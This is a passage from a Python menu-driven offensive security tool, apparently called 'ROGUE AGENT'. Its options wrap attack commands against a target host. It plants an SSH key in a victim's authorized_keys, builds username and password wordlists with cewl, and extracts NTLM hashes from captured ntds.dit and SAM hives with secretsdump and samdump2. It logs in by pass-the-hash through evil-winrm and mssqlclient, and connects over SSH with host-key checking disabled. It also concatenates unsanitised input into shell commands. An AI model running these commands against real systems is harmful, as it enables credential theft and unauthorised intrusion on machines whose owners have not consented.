      subChoice = input("[?] Please select the file you wish to edit: ")      
      if subChoice == "1":
         runCommand("nano " + dataDir + "/usernames.txt")               
         for x in range (0, maxUser):
            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
            USER[x] = spacePadding(USER[x], COL3)         
         wipeTokens(VALD)
         checkParams = 1         
      if subChoice == "2":
         runCommand("nano " + dataDir + "/passwords.txt")
         checkParams = 1         
      if subChoice == "3":
         runCommand("nano " + dataDir + "/hashes.txt")                    
         for x in range (0, maxUser):
               HASH[x] = linecache.getline(dataDir + "/hashes.txt", x + 1).rstrip(" ")
               HASH[x] = spacePadding(HASH[x], COL4)            
         wipeTokens(VALD)
         checkParams = 1         
      if subChoice == "4":
         runCommand("nano /etc/hosts")
         checkParams = 1         
      if subChoice == "5":
         runCommand("nano /etc/resolv.conf")
         checkParams = 1         
      if subChoice == "6":
         runCommand("nano /etc/proxychains.conf")
         checkParams = 1         
      if subChoice == "7":
         runCommand("nano /etc/krb5.conf")
         checkParams = 1
      if subChoice == "8":
         pass
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Proxychain ON/OFF
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='72':        
      if proxyChains == 0:
         proxyChains = 1
         print("[+] Proxychains activated...")
      else:
         proxyChains = 0
         print("[-] Proxychains de-activated...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - SSH KEY GEN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='73':
      print(colored("[*] Generating Keys...", colour3))
      if os.path.exists("id_rsa.pub"):
         runCommand("rm id_rsa")
         runCommand("rm id_rsa.pub")
      runCommand("ssh-keygen -t rsa -b 4096 -N '' -f './id_rsa' >/dev/null 2>&1")
      runCommand("chmod 600 id_rsa")
      catsFile("id_rsa.pub")
      print("[+] Now insert the above into authorized_Keys on the victim's machine...")            
      if USR[:2] == "''":
         print("[+] Then ssh login with this command:- ssh -i id_rsa user@" + TIP.rstrip(" ") +"...")
      else:
         print("[+] Then ssh login with this command:- ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + "...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - klai cewl
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='74':
      checkParams = test_PRT("80")
      if checkParams != 1:
         checkParams = test_WEB()
         if checkParams != 1:
            if WEB[:5] != "EMPTY":
               runCommand("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + WEB.rstrip(" ") + " 2>&1")
               print("[+] Username list generated via website...")
            else:
               checkParams = test_TIP()
               if checkParams != 1:
                  runCommand("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " 2>&1")
                  print("[+] Username list generated via ip address...")
      else:
         runCommand("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/usernames.txt 2>&1")
         cutLine("# minimal list of very", dataDir + "/usernames.txt")
         print("[+] Username list generated via /usr/share/ncrack/minimal.usr...")

      for x in range (0, maxUser):
         USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
         USER[x] = spacePadding(USER[x], COL3)         
      wipeTokens(VALD)         
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Kali cewl
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='75':
      checkParams = test_PRT("80")
      if checkParams != 1:
         checkParams = test_WEB()
         if checkParams != 1:
            if WEB[:5] != "EMPTY":
               runCommand("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt" + WEB.rstrip(" ") + " 2>&1")
               print("[+] Password list generated via website...")
            else:
               checkParams = test_TIP()
               if checkParams != 1:
                  runCommand("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt" + TIP.rstrip(" ") + " 2>&1")
                  print("[+] Password list generated via ip address...")
      else:
         runCommand("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/passwords.txt 2>&1")
         cutLine("# minimal list of very", dataDir + "/passwords.txt")
         print("[+] Password list generated via /usr/share/ncrack/minimal.usr...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - NTDS DECRYPT
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='76':
      print(colored("[*] Checking " + workDir + " for relevant files...", colour3))      
      if os.path.exists("./" + workDir + "/ntds.dit"):
         print("[+] File ntds.dit found...")
      else:
         print("[-] File ntds.dit not found, checking for SAM...")         
         if os.path.exists("./" + workDir + "/SAM"):
            print("[+] File SAM found...")
         else:
            print("[-] File SAM not found...")
            checkParams =1            
         if os.path.exists("./" + workDir + "/SYSTEM"):
            print("[+] File SYSTEM found...")
         else:
           print("[-] File SYSTEM not found...")
           checkParams = 1                  
         if os.path.exists("./" + workDir + "/SECURITY"):
            print("[+] File SECURITY found...")
         else:
            print("[-] File SECURITY not found")
      if checkParams != 1:
         print(colored("[*] Extracting stored secrets, please wait...", colour3))         
         if os.path.exists("./" + workDir + "/ntds.dit"):
            print("[+] Found ntds.dit...")
            runCommand(keyPath + "secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
            runCommand("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
            runCommand("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")
         else:
            if os.path.exists("./" + workDir + "/SECURITY"):
               print("[+] Found SAM, SYSTEM and SECURITY...")
               runCommand(keyPath + "secretsdump.py -sam ./" + workDir + "/SAM -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/sam-extract > log.tmp")      
               runCommand("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
               runCommand("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
            else:
               print("[+] Found SAM and SYSTEM...")
               runCommand("samdump2 ./" + workDir + "/SYSTEM ./" + workDir + "/SAM > ./" + workDir + "/sam-extract.sam")
               runCommand("sed -i 's/\*disabled\* *//g' ./" + workDir + "/sam-extract.sam")
               runCommand("cut -f1 -d':' ./" + workDir + "*/sam-extract.sam > " + dataDir + "/usernames.txt")
               runCommand("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
         print("[+] Importing extracted secrets...")         
         with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
           for x in range (0, maxUser):
               USER[x] = read1.readline().rstrip("\n")
               USER[x] = spacePadding(USER[x], COL3)                  
               HASH[x] = read2.readline().rstrip("\n")               
               if USER[x] != "":
                  HASH[x] = spacePadding(HASH[x], COL4)
               else:
                  HASH[x] = dotPadding(HASH[x], COL4)
               VALD[x] = "0"               
         wipeTokens(VALD)          
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='77':
      print("\nA NEW HYDRA INTERFACE IS BEING DEVELOPED.")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Redis Client
# Modified: N/A
# ------------------------------------------------------------------------------------- 

   if selection =='78':
      runCommand("redis-cli -h " + TIP.rstrip(" ") + " --pass " + PAS.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='79':
      checkParams = test_TIP()            
      if checkParams != 1:
         checkParams = test_PRT("873")         
      if checkParams != 1:
         checkParams = test_TSH()               
      if checkParams != 1:
         runCommand("rsync -av rsync://" + TIP.rstrip(" ") +  ":873/" + TSH.rstrip(" ") + " " + TSH.rstrip(" "))
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '80':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_PRT("873")         
      if checkParams != 1:
         runCommand("rsync -a rsync://" + TIP.rstrip(" ") +  ":873")  
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - FTP uses port 21
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='81':
      checkParams = test_TIP()            
      if checkParams != 1:
         checkParams = test_PRT("21")                 
      if checkParams != 1:
         runCommand("ftp " + TIP.rstrip(" ") + " 21")
      prompt()       
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Ssh uses port 22
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='82':
      checkParams = test_TIP()            
      if checkParams != 1:
         checkParams = test_PRT("22")                 
      if checkParams != 1:
         runCommand("sshpass -p '" + PAS.rstrip(" ") + "' ssh -o 'StrictHostKeyChecking no' " + USR.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Ssh id_rsa use port 22
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='83':
      checkParams = test_TIP()      
      if checkParams != 1:
         checkParams = test_PRT("22")          
      if checkParams != 1:
         runCommand("ssh -i id_rsa " + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -p 22")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Telnet randon port number
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='84':
      checkParams = test_TIP()                  
      if checkParams != 1:
         checkParams = getPort()
      if checkParams != 1:
         runCommand("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ") + " " + checkParams)
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - NC random port number
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='85':
      checkParams = test_TIP()            
      if checkParams != 1:
         checkParams = getPort()               
      if checkParams != 1:
         runCommand("nc " + TIP.rstrip(" ") + " " + checkParams)
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - MSSQLCLIENT uses port 1433
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='86':
      checkParams = test_DOM()            
      if checkParams != 1:
         checkParams = test_PRT("1433")               
      if checkParams != 1:
         if PAS[:1] != " ":
            runCommand(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -windows-auth")
         else:
            if NTM[:1] != " ":
               print("[i] Using HASH value as password credential...")
               runCommand(keyPath + "mssqlclient.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes " + NTM.rstrip(" ") + " -windows-auth")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - MYSQL Login uses port 3306
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='87':
      checkParams = test_TIP()                  
      if checkParams != 1:
         checkParams = test_PRT("3306")            
      if checkParams != 1:
         runCommand("mysql -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -h " + TIP.rstrip(" "))
      prompt() 

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - WINRM remote login uses PORT 5985
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='88':
      if IP46 == "-4":
         checkParams = test_TIP()
      else:
         checkParams = test_DOM()                  
      if checkParams != 1:
         checkParams = test_PRT("5985")            
      if checkParams != 1:
         if NTM[:5] != "EMPTY":
            print("[i] Using the HASH value as a password credential...")
            if IP46 == "-4":
               runCommand("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
            else:
               runCommand("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
         else:
            if IP46 == "-4":
               runCommand("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")            
            else:
               runCommand("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Xfreeredp port number 3389
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '89':
      checkParams = test_TIP()            
      if checkParams != 1:
         checkParams = test_PRT("3389")                     
      if checkParams != 1:
         runCommand("xfreerdp -sec-nla /u:" + USR.rstrip(" ") + " /p:" + PAS.rstrip(" ") + " /v:" + TIP.rstrip(" "))
      prompt()             
                 
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Save running config to config.txt and exit program
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '90':        
      saveParams()
      runCommand("rm *.tmp")      
      if DOMC == 1:
         print("[+] Removing domain name from /etc/hosts...")
         runCommand("sed -i '$d' /etc/hosts")         
      if DNSC == 1:
         print("[+] Removing dns server from /etc/resolv.conf...")
         runCommand("sed -i '$d' /etc/resolv.conf")         
      connection.close()
      print(colored("[*] Program sucessfully terminated...", colour3))
      exit(1)        
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Secret option
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '100':
      dispBanner("ROGUE AGENT",1)
      print(colored("C O P Y R I G H T  2 0 2 1  -  T E R E N C E  B R O A D B E N T",colour7,attrs=['bold']))
      print("\n------------------------------------------------------------------------------")
      count = lineCount(dataDir + "/usernames.txt")
      print("User Names : " + str(count))
      count = lineCount(dataDir + "/passwords.txt")
      print("Pass Words : " + str(count))
      count = lineCount(dataDir + "/hashes.txt")
      print("Hash Values: " + str(count))      
      if HTTP != 0:
         print("Service    : Running")
      else:
         print("Service    : Not running")
      prompt()      
# Eof...
